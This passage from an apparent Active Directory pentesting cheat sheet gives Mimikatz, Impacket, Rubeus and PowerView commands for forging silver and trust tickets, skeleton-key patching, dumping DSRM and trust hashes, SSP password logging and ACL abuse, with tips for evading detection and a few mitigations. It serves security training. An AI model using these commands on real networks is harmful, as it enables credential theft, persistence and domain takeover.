<li>It could be possible to use a forged TGS to access to the target host and alter the parameter in the registry that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting persistence on the machine.</li>
</ul>
</li>
<li>Machine accounts can be used as normal AD accounts, allowing not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.</li>
</ul>
<p>Generate a silver ticket:</p>
<div class="highlight"><pre><span></span><code>kerberos::golden<span class="w"> </span>/admin:&lt;Any<span class="w"> </span>user&gt;<span class="w"> </span>/domain:&lt;Domain&gt;<span class="w"> </span>/id:500<span class="w"> </span>/sid:&lt;Domain<span class="w"> </span>SID&gt;<span class="w"> </span>/target:&lt;Hostname<span class="w"> </span>of<span class="w"> </span>server<span class="w"> </span>being<span class="w"> </span>targeted&gt;<span class="w"> </span>/rc4:&lt;NTLM<span class="w"> </span>Hash<span class="w"> </span>of<span class="w"> </span>machine<span class="w"> </span>account<span class="w"> </span>of<span class="w"> </span>target&gt;<span class="w"> </span>/service:cifs<span class="w"> </span>/ptt
</code></pre></div>
<p>Where:</p>
<ul>
<li><strong>/admin</strong> - The username we want to impersonate. This does not have to be a valid user.  </li>
<li><strong>/domain</strong> - The FQDN of the domain we want to generate the ticket for.  </li>
<li><strong>/id</strong> -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  </li>
<li><strong>/sid</strong> -The SID of the domain we want to generate the ticket for.</li>
<li><strong>/target</strong> - The hostname of our target server.It can be any domain-joined host.  </li>
<li><strong>/rc4</strong> - The NTLM hash of the machine account of our target. </li>
<li><strong>/service</strong> - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access (take a look <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services">here</a>).<ul>
<li>CIFS: access target filesystem (for example, with SMB).</li>
<li>HOST: permits to schedule and execute a task on the target, allowing to achieve command execution. Allows also running WMI queries.</li>
</ul>
</li>
<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used. Alternatively, use <strong>/ticket</strong> to save the ticket to a file for later use*.</li>
</ul>
<p><strong>*Note 1</strong>: Detection tools generally look for tickets lifespan. It's usually better to comply to the Kerberos policy or at least to the AD default settings in order to avoid detection.
<strong>*Note 2</strong>: Detection tools generally look for tickets whose usage is deferred respect their generation.</p>
<p>*<strong>Note 3</strong>: When forging tickets, before November 2021 updates, the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This applies to Golden &amp; Silver Tickets.</p>
<p>TODO: Diamond tickets &amp; Sapphire Tickets</p>
<p>Open a shell with the injected ticket:</p>
<div class="highlight"><pre><span></span><code>misc::cmd
</code></pre></div>
<p>List current session's Kerberos tickets:</p>
<div class="highlight"><pre><span></span><code>klist
</code></pre></div>
<p>Create a ticket with Impacket's <code>ticketer</code>:</p>
<div class="highlight"><pre><span></span><code>ticketer.py<span class="w"> </span>-domain<span class="w"> </span>&lt;current<span class="w"> </span>domain&gt;<span class="w"> </span>-domain-sid<span class="w"> </span>&lt;current<span class="w"> </span>domain<span class="w"> </span>SID&gt;<span class="w"> </span><span class="o">[</span>-extra-sid<span class="w"> </span>&lt;extra<span class="w"> </span>SIDs<span class="w"> </span>list&gt;<span class="o">]</span><span class="w"> </span><span class="o">(</span>-nthash<span class="w"> </span>&lt;NTLM<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>used<span class="w"> </span><span class="k">for</span><span class="w"> </span>signing&gt;<span class="p">|</span>-aesKey<span class="w"> </span>&lt;aes<span class="w"> </span>key<span class="w"> </span>used<span class="w"> </span><span class="k">for</span><span class="w"> </span>signing&gt;<span class="o">)</span><span class="w"> </span><span class="o">[</span>-spn<span class="w"> </span>&lt;silver<span class="w"> </span>ticket<span class="w"> </span>SPN&gt;<span class="o">]</span><span class="w"> </span>&lt;username<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>newly<span class="w"> </span>created<span class="w"> </span>ticket&gt;
</code></pre></div>
<p>See <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#pass-the-attacks">Pass-the-*-attacks - Pass-the-Ticket</a>.</p>
<h3 id="skeleton-key">Skeleton Key</h3>
<p>Skeleton key technique consists into patching a DC's <code>lsass</code> process so that it allows to access as any user with a single 'master' password.</p>
<ul>
<li>This technique requires <strong>domain admin</strong> privileges.</li>
<li>This technique is <strong>NOT</strong> persistent across reboots.</li>
<li>Users can still authenticate with their original password. <ul>
<li>It makes detecting it hard to detect.</li>
</ul>
</li>
<li>This attack currently supports NTLM and Kerberos (RC4 only) authentications. For more details, take a look <a href="https://www.thehacker.recipes/ad/persistence/skeleton-key/#theory">here</a>.</li>
</ul>
<p>With <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>privilege::debug
misc::skeleton
</code></pre></div>
<ul>
<li>Access any machine that authenticates against the compromised DC with a valid username and "mimikatz" as the password (or the actual password for the account).</li>
<li>In a real testing environment, it would be more appropriated to change the skeleton key:<ul>
<li>Modify the source code to change the key and recompile Mimikatz.</li>
</ul>
</li>
</ul>
<p>If <code>lsass</code> is running as <strong>protected process</strong> the <code>mimidriv.sys</code> (mimikatz driver) is required on the target DC:</p>
<div class="highlight"><pre><span></span><code>privilege::debug
!+
!processprotect<span class="w"> </span>/process:lsass.exe<span class="w"> </span>/remove
misc::skeleton
!-
</code></pre></div>
<ul>
<li><strong>Very noisy!</strong> It requires to employ a kernel mode driver.</li>
</ul>
<h4 id="mitigations_8">Mitigations</h4>
<ul>
<li>Run <code>lsass.exe</code> as a protected process; this forces an attacker to load a kernel mode driver to perform the attack.<ul>
<li><code>New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose</code></li>
</ul>
</li>
</ul>
<h3 id="abusing-trusts_1">Abusing Trusts</h3>
<h4 id="trust-across-domains">Trust across domains</h4>
<p>When a client in domain <strong>A</strong> needs to access an Application Server in another domain <strong>B</strong>, passing across a trust boundary, the following steps are involved:</p>
<ol>
<li>Client requests TGT to DC for domain A (DCa)</li>
<li>DCa returns the TGT</li>
<li>Client sends the TGT and the TGT request for the service on domain B</li>
<li>DCa returns a <strong>inter-realm TGT</strong> (<strong>Trust Ticket</strong>), signed with a <strong>trust key</strong>.</li>
<li>Client sends the inter-realm TGT and the TGS request to the DC for domain B (DCb)</li>
<li>DCb decrypts the TGT with the <strong>trust key</strong>; if the decryption is successful, it assumes the TGT is valid, then returns the TGS for the requested service</li>
<li>Client authenticates to the application server with the TGS</li>
</ol>
<p><img alt="ad-trust-accross-domains.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/ad-trust-accross-domains.png"/></p>
<p>Being able to dump the <strong>trust key</strong> allows an attacker to forge valid Trust Tickets since the only validation in place for those is the decryption by the DCb (step 6).</p>
<ul>
<li>Generally, <strong>Domain Admin privileges are required</strong> to dump this key from the DC (DCa in the example).</li>
<li>The trust key is simply the NTLM hash of a service account for the trusted domain.</li>
</ul>
<p>Note: having the <code>krbtgt</code>'s hash allows to forge the trust ticket without the need to obtain the trust key.</p>
<p>The main goal for this attack is that of compromise a parent domain from a child domain, abusing the <strong>implicit trust</strong> between those.</p>
<p>In this attack, the <code>SIDHistory</code> attribute is generally spoofed to contain the target group SID which generally is the Enterprise Administrators group's SID.</p>
<ul>
<li>the <code>SIDHistory</code> attribute contains previous SIDs used for the object if the object was moved from another domain.</li>
</ul>
<p>In order to achieve a better level of stealthiness, instead of directly using the Enterprise Administrator's SID, it's possible to use the <strong>Domain Controllers</strong> and the <strong>Enterpise Domain Controller</strong>'s SIDs (comma-separated); from the blue team perspective, looking at the logs it will seem like the DCs talking each other which is very common, looking way less suspicious.</p>
<h4 id="trust-across-forest">Trust across forest</h4>
<p>When dealing with forest, the same considerations for <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#trust-across-domains">Trust across domains</a> apply when the <strong>forest trust is bidirectional</strong>; the difference is that the trust boundary between two DCs (the roots) in different forests.</p>
<ul>
<li>When performing the attack on <strong>Forest Trusts</strong> and <strong>External Trusts</strong>, it's not always reliable to spoof the <code>SIDHistory</code> due to SID filtering; without <code>SIDHistory</code> spoofing, the impersonated Administrator user will have its original privileges (may not be Enterprise Admin).</li>
</ul>
<p>Dump trust key from the DC with <code>mimikatz</code> (Domain Admin privileges required):</p>
<div class="highlight"><pre><span></span><code>lsadump::trust<span class="w"> </span>/patch

<span class="c1"># or</span>
lsadump:lsa<span class="w"> </span>/patch

<span class="c1"># or</span>
lsadump::dcsync<span class="w"> </span>/user:&lt;trusted<span class="w"> </span>domain<span class="w"> </span>service<span class="w"> </span>account&gt;$
</code></pre></div>
<p>Forge a trust ticket using the dumped trust key or the krbtgt's hash with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Using trust key</span>
Kerberos::golden<span class="w"> </span>/user:Administrator<span class="w"> </span>/domain:&lt;current<span class="w"> </span>domain<span class="w"> </span>FQDN&gt;
/sid:&lt;current<span class="w"> </span>domain<span class="w"> </span>SID&gt;<span class="w"> </span>/sids:&lt;extra<span class="w"> </span>SID<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>when<span class="w"> </span>spoofing<span class="w"> </span>the<span class="w"> </span>SID<span class="w"> </span>History<span class="w"> </span>-<span class="w"> </span>generally<span class="w"> </span>Enterprise<span class="w"> </span>Admins<span class="w"> </span>SID<span class="w"> </span>of<span class="w"> </span>target<span class="w"> </span>domain&gt;<span class="w">  </span>/rc4:&lt;trust<span class="w"> </span>key&gt;<span class="w"> </span>/service:krbtgt<span class="w"> </span>/target:&lt;target<span class="w"> </span>domain<span class="w"> </span>FQDN&gt;<span class="w"> </span>/ticket:&lt;output<span class="w"> </span>path<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>ticket&gt;

<span class="c1"># Using krbtgt's hash</span>
Kerberos::golden<span class="w"> </span>/user:Administrator<span class="w"> </span>/domain:&lt;current<span class="w"> </span>domain<span class="w"> </span>FQDN&gt;
/sid:&lt;current<span class="w"> </span>domain<span class="w"> </span>SID&gt;<span class="w"> </span>/sids:&lt;extra<span class="w"> </span>SID<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>when<span class="w"> </span>spoofing<span class="w"> </span>the<span class="w"> </span>SID<span class="w"> </span>History<span class="w"> </span>-<span class="w"> </span>generally<span class="w"> </span>Enterprise<span class="w"> </span>Admins<span class="w"> </span>SID<span class="w"> </span>of<span class="w"> </span>target<span class="w"> </span>domain&gt;<span class="w"> </span>/krbtgt:&lt;krbtgt<span class="w"> </span>hash&gt;<span class="w"> </span>/target:&lt;target<span class="w"> </span>domain<span class="w"> </span>FQDN&gt;<span class="w"> </span>/ticket:&lt;output<span class="w"> </span>path<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>ticket&gt;
</code></pre></div>
<ul>
<li>When performing this attack on <strong>Forest Trusts</strong> and <strong>External Trusts</strong>, drop the <code>/sids</code> parameter when forging the ticket; it's not always reliable to spoof the <code>SIDHistory</code> due to SID filtering.</li>
<li>Take a look here for <a href="https://system32.eventsentry.com/codes/field/Well-known%20Security%20Identifiers%20(SIDs)">well-known SIDS</a></li>
</ul>
<p>Request a TGS using the forged trust ticket with <code>Rubeus</code>:</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe<span class="w"> </span>asktgs<span class="w"> </span>/ticket:&lt;path<span class="w"> </span>to<span class="w"> </span>tgt&gt;<span class="w"> </span>/service:&lt;service<span class="w"> </span>SPN&gt;<span class="w"> </span>/dc:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/ptt
</code></pre></div>
<h4 id="mssql-database-links">MSSQL Database Links</h4>
<p>A database link is a schema object in one database that enables you to access objects and execute procedures on another database.</p>
<ul>
<li>When a link exists between two or more SQL databases, they're called *<em>Linked SQL servers</em>.</li>
</ul>
<p>Database links can exists also across <strong>forest trusts</strong>:</p>
<ul>
<li>Abusing these trusts may allow to perform lateral movement or privilege escalation between different forests.</li>
</ul>
<p>Following cmdlets are from <a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a>.</p>
<p>Discover domain SQL Server Instances i.e. all SQL server with a SPN registered on the DC:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-SQLInstanceDomain</span>
</code></pre></div>
<p>Check reachability to SQL servers: </p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-SQLConnectionTestThreaded</span>

<span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="nb">Get-SQLConnectionTestThreaded</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Get general server information such as SQL/OS versions, service accounts, sysdmin access, etc.:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-SQLServerInfo</span>

<span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="nb">Get-SQLServerInfo</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Enumerate database links:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-SQLServerLinkCrawl</span> <span class="n">-Instance</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">sql</span> <span class="n">server</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Run query on a linked database with <code>Openquery()</code>:</p>
<div class="highlight"><pre><span></span><code><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">openquery</span><span class="p">(</span><span class="ss">"&lt;target sql server&gt;"</span><span class="p">,</span><span class="s1">'&lt;query&gt;'</span><span class="p">)</span>
</code></pre></div>
<p>Enumerate database links (manually):</p>
<div class="highlight"><pre><span></span><code><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">sysservers</span>

<span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">openquery</span><span class="p">(</span><span class="ss">"&lt;target sql server&gt;"</span><span class="p">,</span><span class="s1">'select * from master..sysservers'</span><span class="p">)</span>
</code></pre></div>
<p>Take a look to the complete PowerUpSQL cheat-sheet for OS command execution and many other features:</p>
<ul>
<li><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">PowerUpSQL Cheat-Sheet</a></li>
</ul>
<h4 id="mitigations_9">Mitigations</h4>
<p>Enable <strong>SID Filtering</strong>:</p>
<ul>
<li>Prevents attacks that abuses SID History.</li>
<li>It's enabled by default on all inter-forests trusts (intra-forest trusts are assumed secured by default). Gets often disabled since can break things.</li>
</ul>
<p>Enable <strong>Selective Authentication</strong> for inter-forest trusts:</p>
<ul>
<li>When enabled, users between the trusts are not automatically authenticated.</li>
</ul>
<h3 id="directory-services-restore-mode-dsrm_1">Directory Services Restore Mode (DSRM)</h3>
<p><strong>Directory Services Restore Mode</strong> (<strong>DSRM</strong>) allows to take the server offline for emergency maintenance, particularly restoring backups of AD objects. It similar to the <em>Safe Mode</em>.</p>
<p>On every DC there's a local administrator account "Administrator" with a <strong>DSRM password</strong>.</p>
<ul>
<li>This password is required when a server is promoted to Domain Controller.</li>
<li>Rarely it gets changed.</li>
</ul>
<p>Since Windows Server 2008, it's possible to enable the access with the DSRM password without necessarily reboot the DC in DSRM mode:</p>
<ul>
<li>Editing the <strong>DSRMAdminLogonBehavior</strong> registry under <code>HKLM\System\CurrentControlSet\Control\Lsa</code> and setting it with value <code>2</code>, allows to access with the DSRM account regardless AD service has been stopped or not.</li>
<li>In this scenario, it's possible to use the NTLM hash of the DSRM user to access the DC.</li>
</ul>
<p>Dump the DSRM password hash (requires domain admin privileges) with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>token::elevate
lsadump::sam
</code></pre></div>
<p>Enable DSRM user logon behavior:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Set-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> <span class="n">-Name</span> <span class="s2">"DsrmAdminLogonBehavior"</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-PropertyType</span> <span class="n">DWORD</span>
</code></pre></div>
<h3 id="security-support-provider-ssp">Security Support Provider (SSP)</h3>
<p>A <strong>Security Support Provider (SSP)</strong> is a dynamic-link library (DLL) involved in security-related operations, including authentication. An SSP attack consists into injecting a malicious SSP DLL in order to, for example, obtain cleartext password from local accounts that authenticate to the compromised server.</p>
<p>Mimikatz provides a custom SSP DLL - <code>mimilib.dll</code>:</p>
<ul>
<li>This SSP logs local logons, service account and machine account passwords in clear text on the target server.</li>
</ul>
<p>There are two alternative way to exploit this technique with mimikatz:</p>
<ul>
<li>Manually drop the <code>mimilib.dll</code> into <code>system32</code> folder and alter specific registers. <strong>Requires reboot!</strong></li>
<li>Inject <code>mimilib.dll</code> into <code>lsass</code> directly with mimikatz (not stable with Server 2016 and on). <strong>Does not require reboot!</strong></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c"># After copying mimilib.dll to system32</span>

<span class="c">## Get current security packages being used by the system</span>
<span class="nv">$packages</span> <span class="p">=</span> <span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span><span class="p">\</span><span class="n">OSConfig</span><span class="p">\</span> <span class="n">-Name</span> <span class="s1">'Security Packages'</span><span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="s1">'Security Packages'</span>

<span class="c">## append mimilib</span>
<span class="nv">$packages</span> <span class="p">+=</span> <span class="s2">"mimilib"</span>

<span class="c">## Update LSA Security Packages configuration registers</span>
<span class="nb">Set-ItemProperty</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span><span class="p">\</span><span class="n">OSConfig</span><span class="p">\</span> <span class="n">-Name</span> <span class="s1">'Security Packages'</span> <span class="n">-Value</span> <span class="nv">$packages</span>

<span class="nb">Set-ItemProperty</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span><span class="p">\</span> <span class="n">-Name</span> <span class="s1">'Security Packages'</span> <span class="n">-Value</span> <span class="nv">$packages</span>
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>misc::memssp
</code></pre></div>
<p>Logon are logged to: <code>C:\Windows\system32\kiwissp.log</code></p>
<ul>
<li>To change the destination file path, edit <code>mimilib.dll</code> code; an interesting alternative could be <em>SYSVOL</em> since it is accessible by any user in the domain BUT in a real scenario this could introduce some risks.</li>
</ul>
<h3 id="acls-attack">ACLs Attack</h3>
<p>Following a list of common ACLs misconfiguration abuses.</p>
<p>Abuse <code>ResetPassword</code> permission:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-AccountPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;target password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>

<span class="c"># AD Module</span>
<span class="nb">Set-ADAccountPassword</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-NewPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;target password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Abuse <code>ResetPassword</code> permission from UNIX-like systems:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Using net</span>
net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">"&lt;target user&gt;"</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span>/<span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-S<span class="w"> </span><span class="s2">"&lt;DC host&gt;"</span>

<span class="c1"># Using pth-net (net with Pass-the-Hash)</span>
pth-net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">"&lt;target user&gt;"</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span>/<span class="s2">"&lt;controlled user&gt;"</span>%<span class="s2">"ffffffffffffffffffffffffffffffff"</span>:<span class="s2">"&lt;NT hash&gt;"</span><span class="w"> </span>-S<span class="w"> </span><span class="s2">"&lt;DC host&gt;"</span>

<span class="c1"># Using rpcclient</span>
rpcclient<span class="w"> </span>-U<span class="w"> </span>&lt;domain&gt;/&lt;controlled<span class="w"> </span>user&gt;<span class="w"> </span>&lt;DC<span class="w"> </span>host&gt;
&gt;<span class="w"> </span>setuserinfo2<span class="w"> </span>&lt;target<span class="w"> </span>user&gt;<span class="w"> </span><span class="m">23</span><span class="w"> </span>&lt;new<span class="w"> </span>password&gt;
</code></pre></div>
<p>Add <code>FullControl</code> rights on the domain object (as Domain Admin):</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Add-ObjectAcl</span> <span class="n">-TargetDistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-PrincipalSamAccountName</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>

<span class="c"># AD Module</span>
<span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-Principal</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Add <code>FullControl</code> rights on the target object with Impacket's <code>dacledit</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span>-rights<span class="w"> </span><span class="s1">'FullControl'</span><span class="w"> </span>-principal<span class="w"> </span><span class="s1">'&lt;controlled user|group&gt;'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
</code></pre></div>
<p>Restore DACL with Impacket's <code>dacledit</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'restore'</span><span class="w"> </span>-file<span class="w"> </span>&lt;.bak<span class="w"> </span>file&gt;<span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
</code></pre></div>
<p>Add rights for DCSync (as Domain Admin):</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Add-ObjectAcl</span> <span class="n">-TargetDistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-PrincipalSamAccountName</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Rights</span> <span class="n">DCSync</span> <span class="n">-Verbose</span>

<span class="c"># AD Module</span>
<span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-Principal</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-GUIDRight</span> <span class="n">DCSync</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Abuse <code>WriteOwner</code> using Impacket's <code>owneredit</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-owneredit<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span>-new-owner<span class="w"> </span><span class="s1">'&lt;controlled user&gt;'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>
</code></pre></div>
<p>Check current owner with Impacket's <code>owneredit</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-owneredit<span class="w"> </span>-action<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>
</code></pre></div>
<p>Abuse <code>GenericWrite</code> to overwrite users attributes such as:</p>
<ul>
<li><code>profilePath</code> - set this to a controlled SMB server. When the user logs in, it's possible to intercept its NTLM.</li>
<li><code>scriptPath</code> -  should run a script when the user logs in (script seems to be run only when it's already on the machine).</li>
</ul>
<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"&lt;DC ip&gt;"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>object<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span>&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>-v<span class="w"> </span><span class="s1">'&lt;value&gt;'</span>
</code></pre></div>
<p>References:</p>
<ul>
<li><a href="https://github.com/theyoge/AD-Pentesting-Tools/blob/main/Invoke-SDPropagator.ps1">Invoke-SDPropagator</a></li>
</ul>
<h4 id="permission-delegation">Permission Delegation</h4>
<p><strong>Permission delegation</strong> in Active Directory (AD) refers to the process of granting specific rights and permissions to users or groups, enabling them to perform certain administrative tasks without granting them full administrative control. This approach helps balance security with operational efficiency by limiting access to only what is necessary for a given task.</p>
<ul>
<li>This is done by setting specific ACEs to the ACLs groups or users (or, more generally, objects) belong.</li>
</ul>
<p>However, even though the least privilege principle should be applied, it's not always true and ACEs can be misconfigured, allowing an attacker to exploit them.</p>
<p><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#">Here</a> a list of all ACEs enumerated via <code>BloodHound</code> and how to exploit them.</p>
<p>Common misconfigured ACEs:</p>
<ul>
<li><strong>ForceChangePassword:</strong> the principal can reset the password of the target user without knowing the current password of that user.</li>
<li><strong>AddMembers:</strong> the principal has the ability to add users, groups or computers to the target group.</li>
<li><strong>GenericAll:</strong> the users has complete control over the target object; this potentially allows to change the user's password, register an SPN or add an AD object to the target group.</li>
<li><strong>GenericWrite:</strong> the user can update any non-protected parameters of our target object. </li>
<li><strong>WriteOwner:</strong> the user has the ability to update the owner of the target object, eventually taking ownership of it in order to to gain more control over the object.</li>
<li><strong>WriteDACL:</strong> the user can write a new ACEs to the target object's DACL, allowing to eventually set full control on the object.</li>
<li><strong>AllExtendedRights:</strong> the user can perform any action associated with extended AD rights against the target object, such as the ability to force change a user's password.
Abuse <code>AddMember</code> or  <code>GenericWrite</code> ACEs to add a user to the target group:</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c"># Add to the group</span>
<span class="nb">Add-ADGroupMember</span> <span class="s2">"&lt;group&gt;"</span> <span class="n">-Members</span> <span class="s2">"&lt;user&gt;"</span>

<span class="c"># Verify if the user was added successfully</span>
<span class="nb">Get-ADGroupMember</span> <span class="n">-Identity</span> <span class="s2">"&lt;group&gt;"</span>
</code></pre></div>
<p>Abuse <code>ForceChangePassword</code> ACE to permit a user to change the password of the target user:</p>
<div class="highlight"><pre><span></span><code><span class="nv">$Password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;new password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> 

<span class="nb">Set-ADAccountPassword</span> <span class="n">-Identity</span> <span class="s2">"&lt;target user&gt;"</span> <span class="n">-Reset</span> <span class="n">-NewPassword</span> <span class="nv">$Password</span> 
</code></pre></div>
<h4 id="adminsdholder">AdminSDHolder</h4>
<p><strong>AdminSDHolder</strong> is automatically created as an object in the System container of every Active Directory domain. Its purpose is to provide "template" permissions for the <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#protected-account-and-groups">protected accounts and groups</a> in the domain using ACL.</p>
<ul>
<li>Its path is: CN=AdminSDHolder,CN=System,DC=<domain_component>,DC=<domain_component>?</domain_component></domain_component></li>
<li>Although the default owner of <em>AdminSDHolder</em> is the domain's <em>Domain Admins</em> group, members of <em>Administrators</em> or <em>Enterprise Admins</em> can make changes or take ownership of the object.</li>
</ul>
<p>The <strong>Security Descriptor Propagator (SDProp)</strong> process runs every 60 minutes (by default) on the domain controller; It compares the permissions on the domain's <em>AdminSDHolder</em> object with the permissions on the protected accounts and groups in the domain:</p>
<ul>
